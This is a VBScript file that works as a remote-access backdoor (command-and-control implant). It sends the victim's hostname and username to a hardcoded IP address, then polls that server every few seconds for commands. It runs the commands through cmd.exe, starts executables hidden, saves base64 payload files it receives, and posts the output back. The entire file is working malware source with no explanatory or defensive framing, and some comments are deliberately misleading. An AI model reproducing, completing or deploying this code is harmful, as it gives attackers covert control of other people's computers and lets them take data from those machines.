Option Explicit

Dim C2_URL, CLIENT_ID
Dim objShell, objFSO, currentDir

' CONFIGURATION ENDPOINT MAPPING
C2_URL = "http://200.97.165.196"

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Initialize environment path tracker state location
currentDir = objShell.ExpandEnvironmentStrings("%USERPROFILE%")

CLIENT_ID = GetClientID()

RegisterClient

Do While True
    CheckForCommand
    WScript.Sleep 3000
Loop

Function GetClientID()
    Dim path : path = "C:\Windows\Temp\cid.dat"
    If objFSO.FileExists(path) Then
        Dim f : Set f = objFSO.OpenTextFile(path, 1)
        GetClientID = Trim(f.ReadAll) : f.Close
    Else
        ' Generate standard high-tech alphanumeric clean ID string fields
        Dim chars, localId, i
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        localId = ""
        Randomize
        For i = 1 To 8
            localId = localId & Mid(chars, Int(Rnd * Len(chars)) + 1, 1)
        Next
        GetClientID = localId
        Set f = objFSO.CreateTextFile(path, True)
        f.Write GetClientID : f.Close
    End If
End Function

Sub RegisterClient()
    Dim http, data, host, user
    On Error Resume Next
    
    host = objShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    user = objShell.ExpandEnvironmentStrings("%USERNAME%")
    
    data = "{""id"":""" & CLIENT_ID & """,""hostname"":""" & host & """,""username"":""" & user & """}"
    
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    http.Open "POST", C2_URL & "/register", False
    http.setRequestHeader "Content-Type", "application/json"
    http.setRequestHeader "Content-Length", Len(data)
    http.Send data
End Sub

Sub CheckForCommand()
    Dim http, cmd
    On Error Resume Next
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    http.Open "GET", C2_URL & "/command", False
    http.setRequestHeader "X-Client-ID", CLIENT_ID
    http.Send
    
    If Err.Number = 0 Then
        If http.Status = 200 Then
            cmd = Trim(http.responseText)
            If cmd <> "" Then ExecuteCommand cmd
        End If
    End If
End Sub

Sub ExecuteCommand(cmd)
    Dim result
    If InStr(cmd, "action") > 0 And InStr(cmd, "upload") > 0 Then
        result = HandleUpload(cmd)
    Else
        result = RunCommand(cmd)
    End If
    SendResult result
End Sub

Function RunCommand(cmd)
    Dim exec, output, commandLine, targetDir, cleanCmd
    On Error Resume Next
    
    cleanCmd = Trim(cmd)
    
    If LCase(Left(cleanCmd, 3)) = "cd " Then
        targetDir = Trim(Mid(cleanCmd, 4))
        If Left(targetDir, 1) = """" And Right(targetDir, 1) = """" Then
            targetDir = Mid(targetDir, 2, Len(targetDir) - 2)
        End If
        
        Dim fullPath
        If InStr(targetDir, ":") > 0 Then
            fullPath = targetDir
        Else
            fullPath = objFSO.GetAbsolutePathName(currentDir & "\" & targetDir)
        End If
        
        If objFSO.FolderExists(fullPath) Then
            currentDir = fullPath
            RunCommand = "[+] Active directory scope mapped safely to: " & currentDir
        Else
            RunCommand = "[-] Directory resolution path failed: " & fullPath
        End If
        Exit Function
    End If
    
    Dim driveLetter
    driveLetter = Left(currentDir, 2)
    commandLine = "cmd.exe /c " & driveLetter & " && cd """ & currentDir & """ && " & cleanCmd

    If LCase(Right(cleanCmd, 4)) = ".exe" Then
        Dim hiddenCmd
        hiddenCmd = "cmd.exe /c start \"\" /b " & cleanCmd
        objShell.Run hiddenCmd, 0, False
        RunCommand = "[+] Process started hidden. Path: " & currentDir
    Else
        Set exec = objShell.Exec(commandLine)
        Do While exec.Status = 0
            WScript.Sleep 100
        Loop
        output = exec.StdOut.ReadAll()
        If Trim(output) = "" Then output = exec.StdErr.ReadAll()
        If Trim(output) = "" Then output = "[+] Execution successful with blank output."
        RunCommand = output & vbCrLf & "Path: " & currentDir
    End If
End Function

Function HandleUpload(jsonStr)
    On Error Resume Next
    Dim filename, b64, path, stream
    
    filename = Extract(jsonStr, "filename")
    b64 = Extract(jsonStr, "data")
    
    If filename = "" Or b64 = "" Then
        HandleUpload = "[-] Parsing processing array parameters mismatch."
        Exit Function
    End If
    
    path = currentDir & "\" & filename
    
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 
    stream.Open
    stream.Write Base64Decode(b64)
    stream.SaveToFile path, 2 
    stream.Close
    
    If Err.Number <> 0 Then
        HandleUpload = "[-] Dropping file payload stream error: " & Err.Description
    Else
        HandleUpload = "[+] Object written safely into target runtime working space: " & path
    End If
End Function

Function Extract(str, key)
    Dim p, p2
    p = InStr(str, """" & key & """")
    If p = 0 Then Extract = "" : Exit Function
    
    p = InStr(p + Len(key), str, ":")
    If p = 0 Then Extract = "" : Exit Function
    
    p = p + 1
    Do While Mid(str, p, 1) = " " Or Mid(str, p, 1) = """"
        p = p + 1
    Loop
    
    p2 = p
    Do While Mid(str, p2, 1) <> """" And Mid(str, p2, 1) <> "}" And Mid(str, p2, 1) <> ","
        p2 = p2 + 1
    Loop
    
    Extract = Mid(str, p, p2 - p)
End Function

Function Base64Decode(b64)
    Dim xml : Set xml = CreateObject("MSXML2.DOMDocument")
    Dim node : Set node = xml.createElement("b64")
    node.dataType = "bin.base64" : node.text = b64
    Base64Decode = node.nodeTypedValue
End Function

Sub SendResult(result)
    Dim http
    On Error Resume Next
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    http.Open "POST", C2_URL & "/result/" & CLIENT_ID, False
    http.setRequestHeader "Content-Type", "text/plain; charset=utf-8"
    http.Send result
End Sub
              